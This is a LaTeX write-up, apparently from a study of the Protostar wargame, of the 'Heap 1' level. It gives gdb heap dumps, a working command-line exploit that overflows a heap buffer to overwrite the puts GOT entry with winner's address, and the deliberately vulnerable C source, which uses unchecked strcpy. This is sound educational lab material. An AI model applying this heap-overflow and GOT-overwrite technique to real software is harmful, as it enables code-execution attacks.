@@ -1,0 +1,127 @@
+
+\begin{center}\begin{LARGE}Heap 1\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+Here we see that there is no longer any function call pointer that we can exploit
+so we look in to the \code{internet} struct to see that there is a pointer to
+a string allocated on the heap.
+
+We know that the heap is allocated in a contiguous manner, from the source
+code we can see that 4 malloc calls. Thus there should be 4 segments allocated on
+the heap in this order
+
+\begin{lstlisting}[language=bash]
+  {struct i1}
+  {i1->name}
+  {struct i2}
+  {i2->name}
+\end{lstlisting}
+
+
+\subsection*{Idea and Attack process}
+
+Similar to heap 0 we will first find the address location of the heap and
+we will examine what is in the heap. We supply 2 parameters ``aaaa' and ``bbbb'
+and we We will see the pointer to \code{i1->name}
+at address \code{0x804a00c} which does indeed contain our test input to the heap.
+Moving down the heap, we see the pointer for \code{i2->name} which we could
+try to modify.
+
+\begin{lstlisting}[language=bash]
+info proc map
+>>>process 2262
+>>>cmdline = '/opt/protostar/bin/heap1'
+>>>cwd = '/opt/protostar/bin'
+>>>exe = '/opt/protostar/bin/heap1'
+>>>Mapped address spaces:
+>>>
+>>>        Start Addr   End Addr       Size     Offset objfile
+>>>          0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap1
+>>>          0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap1
+>>>          0x804a000  0x806b000    0x21000          0           [heap]
+>>>        0xb7e96000 0xb7e97000     0x1000          0
+>>>        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+>>>        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+>>>        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+>>>        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+>>>        0xb7fd9000 0xb7fdc000     0x3000          0
+>>>        0xb7fe0000 0xb7fe2000     0x2000          0
+>>>        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+>>>        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+>>>        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+>>>        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+  
+x/20x 0x804a000
+>>>0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+>>>0x804a010:      0x00000000      0x00000011      0x61616161      0x00000000
+>>>0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
+>>>0x804a030:      0x00000000      0x00000011      0x62626262      0x00000000
+>>>0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+\end{lstlisting}
+
+Now that we have identified that we can potentially overflow the buffer,
+we try to inject the attack string with the target function. We
+can see from the heap that there is a need to write at least 20bytes of
+character before we can modify the pointer.
+
+Since we can write to any memory address with \code{strcpy} we can modify the
+GOT table such that instead of the \code{puts} function being called in \code{main+168}
+the program calls the \code{winner} function instead. We now also try to find
+the address location of \code{puts}.
+
+\begin{lstlisting}[language=bash]
+print &winner
+>>>$1 = (void (*)(void)) 0x8048494 <winner>
+
+objdump -R heap1 | grep puts
+>>>08049774 R_386_JUMP_SLOT   puts
+\end{lstlisting}
+
+We now finally call the program with the offset and the 2 address of the function
+that we want to call. The first address is the \code{puts} function and the second
+is the function \code{winner} which we want to modify in place of the \code{puts}
+address in the GOT table.
+
+\begin{lstlisting}[language=bash]
+./heap1 `python -c "print 'A' * 20 + '\x74\x97\x04\x08'"` `python -c "print '\x94\x84\x04\x08'"`
+>>>and we have a winner @ 1713043778
+\end{lstlisting}
+
+\subsection*{Source code}
+
+\begin{lstlisting}[language=c]
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/types.h>
+
+struct internet {
+  int priority;
+  char *name;
+};
+
+void winner()
+{
+  printf("and we have a winner @ %d\n", time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  struct internet *i1, *i2, *i3;
+
+  i1 = malloc(sizeof(struct internet));
+  i1->priority = 1;
+  i1->name = malloc(8);
+
+  i2 = malloc(sizeof(struct internet));
+  i2->priority = 2;
+  i2->name = malloc(8);
+
+  strcpy(i1->name, argv[1]);
+  strcpy(i2->name, argv[2]);
+
+  printf("and that's a wrap folks!\n");
+}
+\end{lstlisting}
